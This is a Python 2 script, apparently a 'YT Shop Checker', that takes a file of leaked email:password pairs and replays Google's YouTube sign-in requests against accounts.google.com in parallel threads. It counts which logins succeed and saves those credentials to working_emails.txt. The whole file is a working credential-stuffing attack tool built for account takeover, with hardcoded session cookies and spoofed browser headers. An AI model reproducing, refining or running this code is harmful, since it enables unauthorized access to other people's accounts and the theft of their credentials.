import requests
import json
import threading
import os
import glob


SUCCESS_LOGIN  = 0
FAILED_LOGIN   = 0
Threadtimeout = 60
ThreadPoolSize = 3
ValidEmails = []
storeThreads = []

def threadManager(function,Funcargs,Startthreshold,Threadtimeout=5):
	if len(storeThreads) != Startthreshold:
		storeThreads.append(threading.Thread(target=function,args=tuple(Funcargs) ))
	if len(storeThreads) == Startthreshold:
		for metaThread in storeThreads:
			metaThread.start()
		for metaThread in storeThreads:
			metaThread.join(Threadtimeout)
		del storeThreads[::]
def G_identifier(email,SessionManager):
	while 1:
		try:
			params = (('hl', 'en'),('_reqid', '60794'),('rt', 'j'))
			headers = {
			    'x-same-domain': '1',
			    'origin': 'https://accounts.google.com',
			    'accept-encoding': 'gzip, deflate, br',
			    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
			    'google-accounts-xsrf': '1',
			    'cookie': 'GAPS=1:5anptsFCcX86o8zx79JaMKbjR6SUSg:i9ZZi85-G8eD7wsC; ',
			    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36',
			    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
			    'accept': '*/*',
			    'referer': 'https://accounts.google.com/signin/v2/identifier?continue=https%3A%2F%2Fwww.youtube.com%2Fsignin%3Fhl%3Den%26app%3Ddesktop%26next%3D%252F%26action_handle_signin%3Dtrue&hl=en&service=youtube&passive=true&uilel=3&flowName=GlifWebSignIn&flowEntry=ServiceLogin',
			    'authority': 'accounts.google.com',
			    'dnt': '1'
			}
			data = [
			  ('continue', 'https://www.youtube.com/signin?hl=en&app=desktop&next=%2F&action_handle_signin=true'),
			  ('service', 'youtube'),
			  ('hl', 'en'),
			  ('f.req', '["{email}","",[],null,"EG",null,null,2,false,true,[null,null,[2,1,null,1,"https://accounts.google.com/ServiceLogin?continue=https%3A%2F%2Fwww.youtube.com%2Fsignin%3Fhl%3Den%26app%3Ddesktop%26next%3D%252F%26action_handle_signin%3Dtrue&hl=en&service=youtube&passive=true&uilel=3",null,[],4,[],"GlifWebSignIn"],1,[null,null,[]],null,null,null,true],"{email}"]'.format(email=email)),
			  ('cookiesDisabled', 'false'),
			  ('deviceinfo', '[null,null,null,[],null,"EG",null,null,[],"GlifWebSignIn",null,[null,null,[]]]'),
			  ('gmscoreversion', 'undefined'),
			  ('checkConnection', 'youtube:202:1'),
			  ('checkedDomains', 'youtube'),
			  ('pstMsg', '1')
			]
			response = SessionManager.post('https://accounts.google.com/_/signin/sl/lookup', headers=headers, params=params, data=data)
			return json.loads((response.content).replace(")]}'",""))[0][0][2]
		except:
			pass
def login(identifier,password,SessionManager):
	while(1):
		try:
			params = (('hl', 'en'),('_reqid', '260794'),('rt', 'j'))
			headers = {
			    'x-same-domain': '1',
			    'origin': 'https://accounts.google.com',
			    'accept-encoding': 'gzip, deflate, br',
			    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
			    'google-accounts-xsrf': '1',
			    'cookie': 'GAPS=1:Q6gx2sQ34TRRxWUO3mC1_Be79xLYpA:akZ-LyOsSbAsOKOQ',
			    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36',
			    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
			    'accept': '*/*',
			    'referer': 'https://accounts.google.com/signin/v2/sl/pwd?continue=https%3A%2F%2Fwww.youtube.com%2Fsignin%3Fhl%3Den%26app%3Ddesktop%26next%3D%252F%26action_handle_signin%3Dtrue&hl=en&service=youtube&passive=true&uilel=3&flowName=GlifWebSignIn&flowEntry=ServiceLogin&cid=1&navigationDirection=forward',
			    'authority': 'accounts.google.com',
			    'dnt': '1',
			}
			data = [
			  ('continue', 'https://www.youtube.com/signin?hl=en&app=desktop&next=%2F&action_handle_signin=true'),
			  ('service', 'youtube'),
			  ('hl', 'en'),
			  ('f.req', '["{G_identifier}",null,1,null,[1,null,null,null,["{Password}",null,true]],[null,null,[2,1,null,1,"https://accounts.google.com/ServiceLogin?continue=https%3A%2F%2Fwww.youtube.com%2Fsignin%3Fhl%3Den%26app%3Ddesktop%26next%3D%252F%26action_handle_signin%3Dtrue&hl=en&service=youtube&passive=true&uilel=3",null,[],4,[],"GlifWebSignIn"],1,[null,null,[]],null,null,null,true]]'.format(G_identifier=identifier,Password=password)),
			  ('cookiesDisabled', 'false'),
			  ('deviceinfo', '[null,null,null,[],null,"EG",null,null,[],"GlifWebSignIn",null,[null,null,[]]]'),
			  ('gmscoreversion', 'undefined'),
			  ('checkConnection', 'youtube:202:1'),
			  ('checkedDomains', 'youtube'),
			  ('pstMsg', '1'),
			]
			response = SessionManager.post('https://accounts.google.com/_/signin/sl/challenge', headers=headers, params=params, data=data)
			login  = (response.content).replace(")]}'","")
			login =  json.loads(login)
			try:
				if "CheckCookie" in response:
					return 1
				if str(login[0][0][5][5]) == "INCORRECT_ANSWER_ENTERED":
					return 0
			except:
				return 1
		except:
			pass


def show_status(action):
	os.system("cls")
	banner = """
>>> ===================================================== <<<
>>> 	                                                  <<<
>>> 	  __   _______   ____  _   _  ___  ____           <<<
>>> 	  \ \ / |_   _| / ___|| | | |/ _ \|  _ \          <<<
>>> 	   \ V /  | |   \___ \| |_| | | | | |_) |         <<<
>>> 	    | |   | |    ___) |  _  | |_| |  __/          <<<
>>> 	    |_|   |_|   |____/|_| |_|\___/|_|             <<<
>>> 	                                        [Checker] <<<
>>> ===================================================== <<<
>>> [DEV] : BitTheByte (Ahmed Ezzat)                      <<<
>>> [GitHub] : https://www.github.com/bitthebyte          <<<
>>> [Version] : 7.0v                                      <<<
>>> +++++++++++++++++++++++++++++++++++++++++++++++++++++ <<<

"""
	if action == "START":
		print banner
	else:
		s = "[+] Successful Logins   = {}\n[!] Failed Logins   	= {}\n"
		print banner
		print s.format(SUCCESS_LOGIN,FAILED_LOGIN)

def main(email,password):
		global FAILED_LOGIN
		global SUCCESS_LOGIN
		SessionManager 	= requests.Session()
		identifier   	= G_identifier(email,SessionManager)
		logged 			= login(identifier,password,SessionManager)
		if not logged:
			FAILED_LOGIN += 1
		else:
			SUCCESS_LOGIN += 1
			ValidEmails.append(email)
try:
	show_status("START")
	ThreadPoolSize_custom = raw_input("[*] Choose number of threads [default = {}] [press Enter to use defaults]: ".format(ThreadPoolSize))
	if ThreadPoolSize_custom != "":
		ThreadPoolSize = int(ThreadPoolSize_custom)
	os.chdir(".")
	for file in glob.glob("*.txt"):
	    print(" |_--> " + file)
	while (1):
		combo_file = raw_input("[*] Setect the name of your [Email:Password] Combo file: ")
		try:
			read_combo  = open(combo_file,"r").read()
			break
		except:
			print "[!] Check your [Email:Password] Combo file name !"
	raw_input("[+] All Done! , Press Enter to start .. ")
	for data in read_combo.split("\n"):
		if data == "":break
		email = data.split(":")[0]
		password = data.split(":")[1]
		threadManager( main, [email,password]  , ThreadPoolSize ,Threadtimeout)
		show_status("")

		write_t = ""
		for x in ValidEmails:
			write_t += "{}:{}\n".format(x,password)
		open('working_emails.txt','a').write(write_t)
		del ValidEmails[::]

except Exception as e:
	print "[!!!] Fetal Error {}".format(e)